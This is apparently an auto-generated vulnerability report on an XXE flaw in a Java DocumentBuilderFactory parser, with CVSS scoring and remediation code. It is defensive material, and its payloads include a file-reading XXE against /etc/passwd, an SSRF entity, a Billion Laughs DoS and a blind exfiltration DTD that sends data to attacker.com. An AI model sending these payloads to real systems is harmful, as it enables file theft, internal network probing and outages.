# XML External Entity (XXE) Vulnerability in Java XML Parser

# Vulnerability Case
During our recent security assessment of Acme Corp's Java-based processing service, we identified that the XML parser configured via the `DocumentBuilderFactory` was vulnerable due to DOCTYPE declarations being enabled by default. This misconfiguration presents an XML External Entity (XXE) vulnerability, where malicious XML payloads may leverage external entities to access sensitive local files or internal network resources. The vulnerability was discovered during a detailed static code review of an XML processing module within an enterprise Java EE stack using Apache Xerces. An attacker exploiting this vulnerability could potentially perform data exfiltration or induce denial-of-service (DoS) conditions, thereby significantly impacting business continuity and data confidentiality.

```java
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;
import java.io.StringReader;
import org.w3c.dom.Document;

public class VulnerableXMLParser {
  public Document parseXML(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // Vulnerable configuration: DOCTYPE declarations are enabled by default.
    // Missing fix: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // Alternatively, disable external entity processing:
    // factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    // factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
  }
}
```

The lack of disabling the DOCTYPE declaration allows an attacker to craft malicious XML payloads containing external entity definitions. When processed by the vulnerable parser, these payloads could be exploited to read arbitrary files, enumerate internal network services, or trigger resource exhaustion, leading to DoS conditions. Given the use of Apache Xerces in a Java EE production environment, the business impact includes potential exposure of sensitive internal data and disruption of critical enterprise services.


context: java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing.documentbuilderfactory-disallow-doctype-decl-missing DOCTYPE declarations are enabled for this DocumentBuilderFactory. This is vulnerable to XML external entity attacks. Disable this by setting the feature "http://apache.org/xml/features/disallow-doctype-decl" to true. Alternatively, allow DOCTYPE declarations and only prohibit external entities declarations. This can be done by setting the features "http://xml.org/sax/features/external-general-entities" and "http://xml.org/sax/features/external-parameter-entities" to false.

# Vulnerability Breakdown
This vulnerability involves an improperly configured XML parser in Acme Corp's Java service which allows processing of DOCTYPE declarations, creating an XML External Entity (XXE) vulnerability.

1. **Key vulnerability elements**:
   - DocumentBuilderFactory with default configuration that enables DOCTYPE declarations
   - Missing security features to disallow DTD processing or external entities
   - Implementation using Apache Xerces in a Java EE environment
   - Potential for arbitrary file access and server-side request forgery

2. **Potential attack vectors**:
   - Submitting XML with malicious external entity definitions
   - Exploiting entity expansion for denial-of-service attacks
   - Leveraging XXE for internal network scanning (SSRF)
   - Using XXE for data exfiltration via out-of-band channels

3. **Severity assessment**:
   - Network-accessible attack vector
   - Low complexity to exploit with readily available attack payloads
   - No privileges required to submit malicious XML
   - High confidentiality impact through arbitrary file reading
   - Potential availability impact through resource exhaustion

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): None (N) 
   - Availability (A): Low (L) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L

# Description
An XML External Entity (XXE) vulnerability has been identified in Acme Corp's Java-based processing service. The vulnerability exists in the XML parsing functionality where the `DocumentBuilderFactory` is configured with default settings that enable DOCTYPE declarations, allowing for XXE attacks.

```java
public Document parseXML(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // Vulnerable: DOCTYPE declarations are enabled by default
    // No security features configured to prevent XXE attacks
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}

```

This vulnerability allows attackers to submit specially crafted XML documents containing external entity references that can access local files, perform server-side request forgery (SSRF), or cause denial-of-service conditions through resource exhaustion. Since the application is running in a production Java EE environment with Apache Xerces, the impact includes potential exposure of sensitive system files, configuration data, and internal network resources.

# CVSS
**Score**: 8.1 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L \
**Severity**: High

The High severity rating (8.1) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely by anyone who can submit XML to the processing service.

- **Low Attack Complexity (AC:L)**: Exploitation requires only crafting a malicious XML document with external entities, which is straightforward and well-documented.

- **No Privileges Required (PR:N)**: An attacker doesn't need any authentication or authorization to exploit the vulnerability if they can reach the XML processing endpoint.

- **No User Interaction (UI:N)**: The vulnerability is triggered automatically when the system processes the malicious XML, without requiring any action from legitimate users.

- **Unchanged Scope (S:U)**: The vulnerability impacts only the vulnerable XML processing component and associated resources.

- **High Confidentiality Impact (C:H)**: An attacker can read arbitrary files from the system, potentially accessing sensitive configuration files, credentials, or other confidential information.

- **No Integrity Impact (I:N)**: The vulnerability doesn't directly enable modification of data.

- **Low Availability Impact (A:L)**: The vulnerability could be exploited to cause resource exhaustion through entity expansion attacks (e.g., "Billion Laughs"), potentially resulting in denial-of-service conditions affecting system performance.

# Exploitation Scenarios
**Scenario 1: File Disclosure Attack**
An attacker submits the following malicious XML to the vulnerable service:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

```

When processed by the vulnerable parser, the external entity references the local `/etc/passwd` file. The contents of this file are then included in the XML document, replacing the `&xxe;` entity. If the application returns the processed XML or derived data in its response, the attacker gains access to sensitive system information.

**Scenario 2: Server-Side Request Forgery (SSRF)**
An attacker submits XML with an entity that references an internal service:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/api/sensitive-data"> ]>
<userInfo>
  <firstName>Jane</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

```

The vulnerable server makes a request to the internal service, which might be inaccessible directly from the internet. The response from the internal service replaces the entity reference, potentially exposing internal API endpoints, services, or data.

**Scenario 3: Denial of Service through Entity Expansion**
An attacker executes a "Billion Laughs" attack by submitting:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>

```

This causes exponential entity expansion, consuming excessive memory and CPU resources, potentially leading to a denial-of-service condition that impacts application availability.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive configuration files, potentially exposing credentials, API keys, and other secrets
- Potential breach of customer data if stored in accessible files, leading to regulatory violations (GDPR, CCPA, etc.)
- Legal and financial repercussions from data protection violations
- Reputational damage if a breach becomes public
- Business continuity issues if denial-of-service attacks are successful
- Costs associated with incident response, forensic investigation, and system remediation

**Technical Impact:**
- Disclosure of sensitive system files (e.g., /etc/passwd, configuration files)
- Exposure of internal network architecture through SSRF attacks
- Potential lateral movement to internal services that trust the vulnerable application
- Server resource exhaustion (CPU, memory) through entity expansion attacks
- Degraded system performance affecting legitimate users
- Potential access to connected backend systems and databases
- Information leakage that could facilitate more targeted attacks

# Technical Details
The vulnerability stems from the default behavior of Java's `DocumentBuilderFactory`, which enables DOCTYPE declarations and external entity processing unless explicitly disabled. In the vulnerable code:

```java
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;
import java.io.StringReader;
import org.w3c.dom.Document;

public class VulnerableXMLParser {
  public Document parseXML(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // No security features configured - this is the vulnerability
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
  }
}

```

The vulnerability allows for several types of XXE attacks:

1. **Basic XXE for File Reading**:
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///path/to/sensitive/file"> ]>
   
```

2. **Blind XXE with Data Exfiltration**:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
   
```
   Where malicious.dtd contains:
   ```xml
   <!ENTITY % data SYSTEM "file:///path/to/sensitive/file">
   <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
   %param1;
   
```

3. **XXE for SSRF**:
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host:port/api"> ]>
   
```

4. **Entity Expansion DoS**:
   Nested entity references causing exponential expansion and resource exhaustion.

Apache Xerces (the XML parser used by default in Java) is fully capable of processing these external entities unless protections are explicitly enabled. When the XML parser processes a DOCTYPE with external entities, it will attempt to fetch the referenced resources, whether they are local files or network resources.

# Remediation Steps
## Disable DOCTYPE Declarations

**Priority**: P0

The most effective mitigation is to completely disable DOCTYPE declarations, which prevents all XXE attacks:

```java
public Document parseXML(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // Disable DOCTYPE declarations completely
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}

```

This feature setting prevents the XML parser from processing any DOCTYPE declarations, effectively blocking all XXE attacks at their source. This is the recommended approach as it's the most secure and requires minimal code changes.
## Disable External Entity Processing

**Priority**: P1

If DOCTYPE declarations must be allowed for DTD validation, disable external entity processing instead:

```java
public Document parseXML(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // Allow DOCTYPE but disable external entity processing
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}

```

This approach still allows DOCTYPE declarations for DTD validation but disables the processing of external entities, preventing XXE attacks. It requires setting multiple security features to ensure comprehensive protection, as different types of external entities must be individually disabled.


# References
* CWE-611 | [Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
* CWE-827 | [Improper Control of Document Type Definition](https://cwe.mitre.org/data/definitions/827.html)
* XXE | [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
* CWE-776 | [Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')](https://cwe.mitre.org/data/definitions/776.html)
